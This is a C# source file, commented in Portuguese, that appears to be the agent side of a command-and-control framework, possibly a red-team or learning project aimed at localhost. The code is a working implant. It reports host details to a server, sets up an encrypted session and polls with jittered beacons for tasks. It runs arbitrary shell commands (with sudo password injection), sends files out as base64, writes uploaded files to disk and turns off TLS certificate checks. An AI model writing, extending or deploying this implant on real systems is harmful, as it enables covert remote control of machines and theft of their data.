using System.Diagnostics;
using System.Text;
using System.Text.Json;
using System.Net.NetworkInformation;
using System.Security.Cryptography;


class Agent
{
    // Configuração do servidor e beacon
    static readonly string SERVER_URL    = "https://localhost:3000";
    static int    BEACON_BASE = 5;
    static int    BEACON_JITTER = 50;
    static readonly int    CMD_TIMEOUT_MS = 30000;

    static readonly HttpClient http = new HttpClient(new HttpClientHandler{
    ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) => true
    });

    static string agentId    = "";
    static string agentToken = "";
    static byte[]? sessionKey = null;
    static ECDiffieHellman ecdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);


    // Começa no diretório onde o agente foi executado.
    static string currentDir = Directory.GetCurrentDirectory();

    static async Task Main(string[] args)
    {
        Console.WriteLine("[*] Agente iniciado...");
        Console.WriteLine($"[*] Diretório inicial: {currentDir}");

        await Register();
        if (string.IsNullOrEmpty(agentId) || string.IsNullOrEmpty(agentToken))
        {
            Console.WriteLine("[-] Falha ao registrar. Encerrando.");
            return;
        }

        Console.WriteLine($"[+] Registrado com ID: {agentId}");


    static string DecryptPayload(string encryptedBase64, byte[] key){
        byte[] buf = Convert.FromBase64String(encryptedBase64);

        byte[] iv         = buf[0..12];
        byte[] tag        = buf[^16..];
        byte[] ciphertext = buf[12..^16];

        byte[] plaintext = new byte[ciphertext.Length];

        using var aes = new AesGcm(key, 16);
        aes.Decrypt(iv, ciphertext, tag, plaintext);

        return Encoding.UTF8.GetString(plaintext);
    }

        // Loop de beacon
        while (true)
        {
            try
            {
                await Register();

                var tasks = await GetTasks();

                foreach (var task in tasks){
                    string taskId = task.GetProperty("_id").GetString() ?? "";

                    string command, stdin, shell;

                    if (task.TryGetProperty("encrypted", out var encProp) && sessionKey != null){
                        string decrypted = DecryptPayload(encProp.GetString()!, sessionKey);
                        var inner = JsonDocument.Parse(decrypted).RootElement;

                        command = inner.GetProperty("command").GetString() ?? "";
                        stdin   = inner.TryGetProperty("stdin", out var s) ? s.GetString() ?? "" : "";
                        shell   = inner.TryGetProperty("shell", out var sh) ? sh.GetString() ?? "auto" : "auto";
                    }
                    else{
                        command = task.GetProperty("command").GetString() ?? "";
                        stdin   = task.TryGetProperty("stdin", out var stdinProp)
                                ? stdinProp.GetString() ?? "" : "";
                        shell   = task.TryGetProperty("shell", out var shellProp)
                                ? shellProp.GetString() ?? "auto" : "auto";
                    }

                    Console.WriteLine($"[>] Executando [{shell}]: {command}");

                    string output = HandleCommand(command, stdin, shell);

                    await SendResult(taskId, output);
                    Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Erro no beacon: {ex.Message}");
            }

            var rng   = new Random();
            int minDelay = BEACON_BASE - BEACON_BASE * BEACON_JITTER / 100;
            int maxDelay = BEACON_BASE + BEACON_BASE * BEACON_JITTER / 100;
            int delay = rng.Next(minDelay, Math.Max(minDelay + 1, maxDelay));
            Console.WriteLine($"[*] Aguardando {delay}s...");
            await Task.Delay(delay * 1000);
        }
    }

    static string HandleCommand(string command, string stdin = "", string shell = "auto")
    {
        string trimmed = command.Trim();

        if (trimmed == "cd" || trimmed.StartsWith("cd ")){
            return BuiltinCd(trimmed);
        }

        if (trimmed == "pwd"){
            return currentDir;
        }

        if (trimmed == "sleep" || trimmed.StartsWith("sleep ")){
            string[] parts = trimmed.Split(' ');

            if (parts.Length < 2)
            return "Uso: sleep base(s) jitter (%)";

            if (!int.TryParse(parts[1], out int newBase))
            return "Valor inválido para base";

            int newJitter = 50; // default
            if (parts.Length >= 3 && int.TryParse(parts[2], out int j))
                newJitter = j;
            
            BEACON_BASE = newBase;
            BEACON_JITTER = newJitter;

            return $"Sleep alterado: base={BEACON_BASE}s, jitter=±{BEACON_JITTER}% - próximo delay entre {BEACON_BASE - BEACON_BASE * BEACON_JITTER / 100}s e {BEACON_BASE + BEACON_BASE * BEACON_JITTER / 100}s";
        }

        if (trimmed == "download" || trimmed.StartsWith("download ")){
            string[] parts = trimmed.Split(' ', 2);
            if (parts.Length < 2)
                return "Uso: download caminho/do/arquivo";

            //resolve o caminho relativo baseado no currentDir

            string resolvedPath = Path.GetFullPath(parts[1], currentDir);
            if (!File.Exists(resolvedPath))
                return $"Arquivo não encontrado: {resolvedPath}";

            try{
                byte[] fileBytes = File.ReadAllBytes(resolvedPath);
                string base64Content = Convert.ToBase64String(fileBytes);
                string name = Path.GetFileName(resolvedPath);
                return $"b64:{name}:{base64Content}";
            }
            catch (Exception ex){
                return $"Erro ao ler arquivo: {ex.Message}";
            }
        }

        if (trimmed == "upload" || trimmed.StartsWith("upload ")){
            string[] parts = trimmed.Split(' ', 2);
            if (parts.Length < 2)
                return "Uso: upload caminho/de/destino";

            if (string.IsNullOrEmpty(stdin))
                return "Erro: nenhum conteúdo recebido (stdin vazio)";

            string originalName = "upload";
            string b64 = stdin;

            int separatorIdx = stdin.IndexOf(':');
            if (separatorIdx > 0 && separatorIdx < 260)
            {
                originalName = stdin.Substring(0, separatorIdx);
                b64 = stdin.Substring(separatorIdx + 1);
            }

            string resolvedDestPath = Path.GetFullPath(parts[1], currentDir);

            if (Directory.Exists(resolvedDestPath))
                resolvedDestPath = Path.Combine(resolvedDestPath, originalName);

            try{
                byte[] bytes = Convert.FromBase64String(b64);
                File.WriteAllBytes(resolvedDestPath, bytes);

                return $"Arquivo salvo: {resolvedDestPath} ({bytes.Length} bytes)";
            }
            catch (Exception ex){
                return $"Erro no upload do arquivo: {ex.Message}";
            }
        }
        return ExecuteCommand(trimmed, stdin, shell);
    }

    static string BuiltinCd(string command)
    {
        // Extrai o destino: "cd /tmp" → "/tmp", "cd" → home
        string target = command.Length > 2 ? command.Substring(3).Trim() : "";

        // Sem argumento ou "~" → vai para o home do usuário
        if (string.IsNullOrEmpty(target) || target == "~")
        {
            target = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        }
        // "~/" → expande para home + resto do caminho
        else if (target.StartsWith("~/") || target.StartsWith("~\\"))
        {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            target = Path.Combine(home, target.Substring(2));
        }

        // Path.GetFullPath resolve caminhos relativos baseando-se no currentDir.
        // Ex: currentDir="/home/user", target="../tmp" → "/home/tmp"
        string resolved = Path.GetFullPath(target, currentDir);

        // Verifica se o diretório realmente existe no filesystem
        if (!Directory.Exists(resolved))
        {
            return $"cd: {target}: Diretório não encontrado";
        }

        // Atualiza o estado interno do agente
        currentDir = resolved;
        return currentDir;
    }

    
    static string ExecuteCommand(string command, string stdin = "", string shell = "auto"){
        try
        {
            bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                System.Runtime.InteropServices.OSPlatform.Windows);

            string finalCommand = command;
            if (!string.IsNullOrEmpty(stdin) && command.StartsWith("sudo"))
            {
                if (!command.Contains("-S"))
                    finalCommand = "sudo -S " + command.Substring(4).TrimStart();
            }

            var proc = new Process();

            switch (shell)
            {
                case "cmd":
                    proc.StartInfo.FileName  = "cmd.exe";
                    proc.StartInfo.Arguments = $"/c {finalCommand}";
                    break;
                case "powershell":
                    proc.StartInfo.FileName  = "powershell.exe";
                    proc.StartInfo.Arguments = $"-NoProfile -NonInteractive -Command \"{finalCommand}\"";
                    break;
                case "bash":
                    proc.StartInfo.FileName  = "/bin/bash";
                    proc.StartInfo.Arguments = $"-c \"{finalCommand}\"";
                    break;
                default:
                    proc.StartInfo.FileName  = isWindows ? "cmd.exe" : "/bin/bash";
                    proc.StartInfo.Arguments = isWindows
                        ? $"/c {finalCommand}"
                        : $"-c \"{finalCommand}\"";
                    break;
            }

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.StartInfo.RedirectStandardInput  = !string.IsNullOrEmpty(stdin);
            proc.StartInfo.UseShellExecute        = false;
            proc.StartInfo.CreateNoWindow         = true;
            proc.StartInfo.WorkingDirectory        = currentDir;

            proc.Start();

            if (!string.IsNullOrEmpty(stdin))
            {
                proc.StandardInput.WriteLine(stdin);
                proc.StandardInput.Close();
            }

            string output = proc.StandardOutput.ReadToEnd()
                          + proc.StandardError.ReadToEnd();

            if (!proc.WaitForExit(CMD_TIMEOUT_MS))
            {
                proc.Kill();
                return output + "\n[timeout: comando excedeu 30s]";
            }

            return string.IsNullOrWhiteSpace(output)
                ? "[comando executado sem output]"
                : output;
        }
        catch (Exception ex)
        {
            return $"[erro ao executar]: {ex.Message}";
        }
    }

    static async Task Register(){
        var ecParams = ecdh.ExportParameters(false);
        byte[] pubBytes = new byte[65];
        pubBytes[0] = 0x04;
        Buffer.BlockCopy(ecParams.Q.X!, 0, pubBytes, 1, 32);
        Buffer.BlockCopy(ecParams.Q.Y!, 0, pubBytes, 33, 32);
        string publicKeyHex = Convert.ToHexString(pubBytes).ToLower();

        var payload = new{
            hostname  = Environment.MachineName,
            username  = Environment.UserName,
            os        = Environment.OSVersion.ToString(),
            ip        = GetLocalIP(),
            arch      = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            pid       = Environment.ProcessId,
            token     = string.IsNullOrEmpty(agentToken) ? null : agentToken,
            cwd       = currentDir,
            publicKey = publicKeyHex
        };

        string json     = JsonSerializer.Serialize(payload);
        var    content  = new StringContent(json, Encoding.UTF8, "application/json");
        var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
        string body     = await response.Content.ReadAsStringAsync();

        var doc   = JsonDocument.Parse(body);
        var agent = doc.RootElement.GetProperty("agent");

        agentId    = agent.GetProperty("_id").GetString() ?? "";
        agentToken = agent.GetProperty("token").GetString() ?? "";

        if (doc.RootElement.TryGetProperty("serverPublicKey", out var spk)){
            string serverPubHex = spk.GetString() ?? "";
            if (!string.IsNullOrEmpty(serverPubHex)){
                byte[] serverPubBytes = Convert.FromHexString(serverPubHex);

                // Extrair X e Y do uncompressed point (04 || X[32] || Y[32])
                var serverParams = new ECParameters{
                    Curve = ECCurve.NamedCurves.nistP256,
                    Q = new ECPoint {
                        X = serverPubBytes[1..33],
                        Y = serverPubBytes[33..65]
                    }
                };

                using var serverEcdh = ECDiffieHellman.Create(serverParams);
                byte[] sharedSecret = ecdh.DeriveRawSecretAgreement(serverEcdh.PublicKey);

                sessionKey = HKDF.DeriveKey(
                    HashAlgorithmName.SHA256,
                    sharedSecret,
                    32,
                    salt: Array.Empty<byte>(),
                    info: Encoding.UTF8.GetBytes("hermes-bird-session")
                );

                Console.WriteLine("[+] Session key derivada com sucesso");
            }
        }
    }


    static async Task<JsonElement[]> GetTasks()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{SERVER_URL}/api/tasks/agent/{agentId}");
        request.Headers.Add("x-api-token", agentToken);

        var response = await http.SendAsync(request);
        string body  = await response.Content.ReadAsStringAsync();

        var doc = JsonDocument.Parse(body);
        return doc.RootElement.EnumerateArray().ToArray() ?? Array.Empty<JsonElement>();
    }

    static async Task SendResult(string taskId, string output)
    {
        var payload = new { output };
        string json    = JsonSerializer.Serialize(payload);
        var    content = new StringContent(json, Encoding.UTF8, "application/json");

        var request = new HttpRequestMessage(HttpMethod.Put, $"{SERVER_URL}/api/tasks/{taskId}/result");
        request.Headers.Add("x-api-token", agentToken);
        request.Content = content;

        await http.SendAsync(request);
    }

    static string GetLocalIP()
    {
        foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (iface.OperationalStatus != OperationalStatus.Up) continue;
            if (iface.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

            foreach (var addr in iface.GetIPProperties().UnicastAddresses)
            {
                if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return addr.Address.ToString();
            }
        }
        return "unknown";
    }
}
